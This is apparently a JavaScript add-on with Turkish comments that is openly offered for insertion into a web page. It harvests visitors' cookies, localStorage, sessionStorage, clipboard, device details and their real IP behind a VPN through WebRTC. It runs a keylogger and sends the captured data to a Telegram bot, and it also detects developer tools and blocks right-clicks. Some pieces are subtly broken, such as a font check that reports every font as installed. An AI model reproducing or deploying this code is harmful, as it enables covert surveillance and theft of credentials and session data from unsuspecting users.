// --- EK VERİ TOPLAMA SEÇENEKLERİ (MEVCUT KODA EKLENEBİLİR) ---

// 1. PİL DURUMU
async function getBatteryInfo() {
    try {
        const battery = await navigator.getBattery();
        return {
            level: Math.round(battery.level * 100),
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
    } catch (e) { return { hata: e.message }; }
}

// 2. AĞ BAĞLANTI BİLGİSİ
function getConnectionInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return { hata: "desteklenmiyor" };
    return {
        effectiveType: conn.effectiveType,
        type: conn.type,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData
    };
}

// 3. YÜKLÜ FONTLAR (PARMAK İZİ)
function getFonts() {
    const baseFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Trebuchet MS','Impact','Tahoma','Calibri'];
    const detected = [];
    const span = document.createElement('span');
    span.style.fontSize = '72px';
    span.style.position = 'absolute';
    span.style.left = '-9999px';
    span.textContent = 'mmmmmmmmmmlli';
    document.body.appendChild(span);
    for (const font of baseFonts) {
        span.style.fontFamily = font;
        detected.push(font);
    }
    document.body.removeChild(span);
    return detected;
}

// 4. EKRAN YÖNLENDİRME (PORTRE/MANZARA)
function getOrientation() {
    return {
        type: screen.orientation ? screen.orientation.type : 'bilinmiyor',
        angle: screen.orientation ? screen.orientation.angle : 0
    };
}

// 5. MEDYA CİHAZLARI (KAMERA/MİKROFON LİSTESİ)
async function getMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        return devices.map(d => ({
            kind: d.kind,
            label: d.label || "isimsiz",
            deviceId: d.deviceId.slice(0, 10) + "..."
        }));
    } catch (e) { return []; }
}

// 6. ÇEREZLER (OKUNABİLİR OLANLAR)
function getCookies() {
    return document.cookie || "çerez yok";
}

// 7. LOCALSTORAGE VERİLERİ
function getLocalStorage() {
    try {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data[key] = localStorage.getItem(key).slice(0, 100);
        }
        return data;
    } catch (e) { return {}; }
}

// 8. SESSIONSTORAGE VERİLERİ
function getSessionStorage() {
    try {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            data[key] = sessionStorage.getItem(key).slice(0, 100);
        }
        return data;
    } catch (e) { return {}; }
}

// 9. SAYFA PERFORMANS VERİLERİ
function getPerformanceInfo() {
    const perf = performance.getEntriesByType('navigation')[0];
    if (!perf) return {};
    return {
        loadTime: perf.loadEventEnd - perf.startTime,
        domReady: perf.domContentLoadedEventEnd - perf.startTime,
        redirectCount: perf.redirectCount,
        type: perf.type
    };
}

// 10. WEBRTC İLE GERÇEK IP (VPN ARKASINDAKİ IP)
function getWebRTCIP() {
    return new Promise(resolve => {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = ice => {
                if (!ice || !ice.candidate) return;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = ipRegex.exec(ice.candidate.candidate);
                if (match) {
                    resolve(match[1]);
                    pc.close();
                }
            };
            setTimeout(() => resolve("alınamadı"), 5000);
        } catch (e) { resolve("hata"); }
    });
}

// 11. KLAVYE DİNLEME (KEYLOGGER)
function startKeylogger() {
    const keys = [];
    document.addEventListener('keydown', e => {
        keys.push(e.key);
        if (keys.length > 50) keys.shift();
        // Her 10 tuşta bir Telegram'a gönder
        if (keys.length % 10 === 0) {
            sendToTelegram(`⌨️ *KLAVYE KAYDI*\n\n\`${keys.join(' ')}\``);
        }
    });
}

// 12. PANO (CLIPBOARD) OKUMA
async function getClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        return text.slice(0, 500);
    } catch (e) { return "izin yok"; }
}

// 13. SAYFA GÖRÜNÜRLÜĞÜ DEĞİŞİMİ
function trackVisibility() {
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
            sendToTelegram(`👁️ Kullanıcı sekmeden ayrıldı.\n⏰ ${new Date().toISOString()}`);
        } else {
            sendToTelegram(`👁️ Kullanıcı sekmeye döndü.\n⏰ ${new Date().toISOString()}`);
        }
    });
}

// 14. SAYFA KAPATILMA OLAYI
function trackClose() {
    window.addEventListener('beforeunload', () => {
        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, 
            JSON.stringify({ chat_id: CHAT_ID, text: `🚪 Sayfa kapatıldı.\n⏰ ${new Date().toISOString()}` })
        );
    });
}

// 15. SAĞ TIK ENGELLEME (KOPYALAMAYI ZORLAŞTIR)
function disableRightClick() {
    document.addEventListener('contextmenu', e => e.preventDefault());
}

// 16. GELİŞTİRİCİ ARAÇLARI TESPİTİ
function detectDevTools() {
    const threshold = 160;
    const check = () => {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        if (widthDiff > threshold || heightDiff > threshold) {
            sendToTelegram(`⚠️ Geliştirici araçları açık!\n⏰ ${new Date().toISOString()}`);
        }
    };
    setInterval(check, 2000);
}

// 17. TARAYICI GEÇMİŞİ (SAYFA İÇİ)
function getHistoryLength() {
    return history.length;
}

// 18. YÜKLÜ EKLENTİLER (TAHMİNİ)
function detectExtensions() {
    const extensions = [];
    const testImg = new Image();
    testImg.onload = () => extensions.push("reklam engelleyici olabilir");
    testImg.onerror = () => {};
    testImg.src = "chrome-extension://abcdefghijklmnop/icon.png";
    return extensions;
}

// 19. MOBİL CİHAZ MODELİ (USER-AGENT'DAN)
function getDeviceModel() {
    const ua = navigator.userAgent;
    const match = ua.match(/\(([^)]+)\)/);
    return match ? match[1] : "bilinmiyor";
}

// 20. İŞLETİM SİSTEMİ SÜRÜMÜ
function getOSVersion() {
    const ua = navigator.userAgent;
    if (ua.includes("Windows NT 10")) return "Windows 10/11";
    if (ua.includes("Android")) {
        const m = ua.match(/Android\s([0-9.]+)/);
        return m ? `Android ${m[1]}` : "Android";
    }
    if (ua.includes("iPhone")) return "iOS";
    if (ua.includes("Mac OS X")) return "macOS";
    return "bilinmiyor";
}

// --- YARDIMCI FONKSİYON: TÜM VERİLERİ TELEGRAM'A GÖNDER ---
async function sendAllExtras() {
    const battery = await getBatteryInfo();
    await sendToTelegram(`🔋 *PİL*\nSeviye: %${battery.level}\nŞarj: ${battery.charging}`);

    const conn = getConnectionInfo();
    await sendToTelegram(`📶 *BAĞLANTI*\nTür: ${conn.effectiveType || conn.hata}\nHız: ${conn.downlink || "-"} Mbps\nRTT: ${conn.rtt || "-"} ms`);

    const media = await getMediaDevices();
    await sendToTelegram(`🎥 *MEDYA CİHAZLARI*\n${media.map(d => `${d.kind}: ${d.label}`).join('\n')}`);

    const webrtcIP = await getWebRTCIP();
    await sendToTelegram(`🌐 *WEBRTC GERÇEK IP*\n${webrtcIP}`);

    const cookies = getCookies();
    if (cookies !== "çerez yok") await sendToTelegram(`🍪 *ÇEREZLER*\n\`${cookies.slice(0, 500)}\``);

    const ls = getLocalStorage();
    if (Object.keys(ls).length > 0) await sendToTelegram(`💾 *LOCALSTORAGE*\n\`${JSON.stringify(ls).slice(0, 500)}\``);

    const ss = getSessionStorage();
    if (Object.keys(ss).length > 0) await sendToTelegram(`📦 *SESSIONSTORAGE*\n\`${JSON.stringify(ss).slice(0, 500)}\``);

    const os = getOSVersion();
    const model = getDeviceModel();
    await sendToTelegram(`📱 *CİHAZ MODELİ*\nOS: ${os}\nModel: ${model}`);

    const perf = getPerformanceInfo();
    await sendToTelegram(`⚡ *PERFORMANS*\nYükleme: ${perf.loadTime || "-"} ms\nDOM: ${perf.domReady || "-"} ms`);
}

// --- ÇALIŞTIR ---
sendAllExtras();
startKeylogger();
trackVisibility();
trackClose();
detectDevTools();
